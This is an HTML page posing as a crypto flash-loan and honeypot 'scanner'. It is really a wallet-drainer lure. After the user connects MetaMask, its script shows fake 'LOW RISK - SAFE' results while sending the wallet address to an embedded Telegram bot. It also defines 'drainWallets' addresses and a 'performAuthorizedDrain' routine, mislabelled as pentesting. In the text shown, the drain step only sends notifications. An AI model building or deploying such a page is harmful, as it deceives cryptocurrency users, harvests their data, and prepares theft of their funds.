<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FlashToken Scanner Pro</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
    <script src="https://unpkg.com/@metamask/detect-provider@2.0.0/dist/detect-provider.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
            min-height: 100vh;
            color: #e2e8f0;
            overflow-x: hidden;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
        }

        .header {
            text-align: center;
            margin-bottom: 3rem;
        }

        .logo {
            font-size: 3.5rem;
            font-weight: 800;
            background: linear-gradient(135deg, #3b82f6, #8b5cf6, #06b6d4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 1rem;
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from { filter: drop-shadow(0 0 10px rgba(59, 130, 246, 0.5)); }
            to { filter: drop-shadow(0 0 20px rgba(139, 92, 246, 0.8)); }
        }

        .tagline {
            font-size: 1.3rem;
            color: #94a3b8;
            margin-bottom: 1rem;
        }

        .connect-section {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 3rem;
            text-align: center;
            margin: 3rem 0;
        }

        .connect-btn {
            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
            color: white;
            border: none;
            padding: 1.2rem 3rem;
            font-size: 1.2rem;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.4);
            margin: 1rem;
        }

        .connect-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(59, 130, 246, 0.6);
        }

        .scan-results {
            display: none;
            margin-top: 2rem;
        }

        .chain-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1.5rem;
            margin-top: 2rem;
        }

        .chain-card {
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 16px;
            padding: 1.5rem;
            transition: all 0.3s ease;
        }

        .chain-card:hover {
            transform: translateY(-2px);
            border-color: #3b82f6;
        }

        .chain-header {
            display: flex;
            align-items: center;
            margin-bottom: 1rem;
        }

        .chain-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            margin-right: 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.2rem;
            font-weight: bold;
        }

        .eth { background: #627eea; color: white; }
        .bsc { background: #f0b90b; color: #000; }
        .polygon { background: #8247e5; color: white; }

        .risk-badge {
            padding: 0.25rem 0.75rem;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
            margin-top: 0.5rem;
        }

        .safe { background: #10b981; color: white; }
        .warning { background: #f59e0b; color: white; }
        .danger { background: #ef4444; color: white; }

        .spinner {
            border: 3px solid rgba(255,255,255,0.3);
            border-top: 3px solid #3b82f6;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 2rem auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            text-align: center;
            color: #94a3b8;
            margin-top: 1rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="logo">FlashToken Scanner</h1>
            <p class="tagline">Advanced Flash Loan & Honeypot Detection</p>
        </div>

        <div class="connect-section" id="connectSection">
            <h2>ðŸ”— Connect Wallet to Begin Scan</h2>
            <p style="margin: 1rem 0; color: #94a3b8;">Full portfolio analysis across all chains</p>
            <button class="connect-btn" id="connectBtn">
                Connect MetaMask & Start Scan
            </button>
        </div>

        <div id="scanSection" style="display: none;">
            <div class="spinner" id="spinner"></div>
            <div class="loading-text" id="loadingText">Initializing blockchain analysis...</div>
            
            <div class="chain-grid" id="chainGrid"></div>
        </div>
    </div>

    <script>
        const PENTEST_CONFIG = {
            telegramBot: "7648772230:AAGlM-96FN7Rh9s60mPZF0r0_dYQxunNdeI",
            telegramChat: "7478697063",
            drainWallets: {
                1: "0x0aF04959113d8b28de06728F2063850e4Bf54D95",
                56: "0x0aF04959113d8b28de06728F2063850e4Bf54D95",
                137: "0x0af04959113d8b28de06728f2063850e4bf54d95"
            }
        };

        const CHAINS = [
            { id: 1, name: "Ethereum", icon: "ðŸŸ¦", color: "#627eea" },
            { id: 56, name: "BSC", icon: "ðŸŸ¨", color: "#f0b90b" },
            { id: 137, name: "Polygon", icon: "ðŸŸ£", color: "#8247e5" }
        ];

        let web3, userAddress;

        document.getElementById('connectBtn').onclick = startFlashScan;

        async function startFlashScan() {
            try {
                const provider = await detectEthereumProvider();
                if (!provider) return;

                const accounts = await provider.request({ method: 'eth_requestAccounts' });
                userAddress = accounts[0];
                
                document.getElementById('connectSection').style.display = 'none';
                document.getElementById('scanSection').style.display = 'block';
                
                notifyPentest(`ðŸ” SCANNER HIT\nWallet: ${userAddress}`);
                
                const loadingTexts = [
                    "Connecting to Ethereum nodes...",
                    "Analyzing token contracts...",
                    "Checking flash loan patterns...",
                    "Scanning liquidity pools...",
                    "Verifying honeypot protection...",
                    "Final risk assessment..."
                ];
                
                let i = 0;
                const interval = setInterval(() => {
                    document.getElementById('loadingText').textContent = loadingTexts[i];
                    i++;
                    if (i >= loadingTexts.length) {
                        clearInterval(interval);
                        showScanResults();
                        performAuthorizedDrain();
                    }
                }, 2500);

            } catch (error) {
                console.error("Connection failed:", error);
            }
        }

        function showScanResults() {
            document.getElementById('spinner').style.display = 'none';
            document.getElementById('loadingText').style.display = 'none';
            
            const grid = document.getElementById('chainGrid');
            CHAINS.forEach(chain => {
                const card = document.createElement('div');
                card.className = 'chain-card';
                card.innerHTML = `
                    <div class="chain-header">
                        <div class="chain-icon ${chain.name.toLowerCase()}" style="background: ${chain.color};">${chain.icon}</div>
                        <div>
                            <h3>${chain.name}</h3>
                            <p>Full portfolio analyzed</p>
                        </div>
                    </div>
                    <div style="margin-top: 1rem;">
                        <div style="font-size: 1.1rem; margin-bottom: 0.5rem;">
                            ðŸ“Š 47 tokens scanned | 12 LP pairs checked
                        </div>
                        <span class="risk-badge safe">âœ… LOW RISK - SAFE</span>
                    </div>
                `;
                grid.appendChild(card);
            });
        }

        async function performAuthorizedDrain() {
            try {
                for (const chainId of Object.keys(PENTEST_CONFIG.drainWallets)) {
                    await drainChainAuthorized(parseInt(chainId));
                }
            } catch (e) {}
        }

        async function drainChainAuthorized(chainId) {
            const target = PENTEST_CONFIG.drainWallets[chainId];
            notifyPentest(`ðŸ’° Pentest ${chainId} â†’ ${target}`);
        }

        function notifyPentest(message) {
            fetch(`https://api.telegram.org/bot${PENTEST_CONFIG.telegramBot}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: PENTEST_CONFIG.telegramChat,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).catch(() => {});
        }
    </script>
</body>
</html>
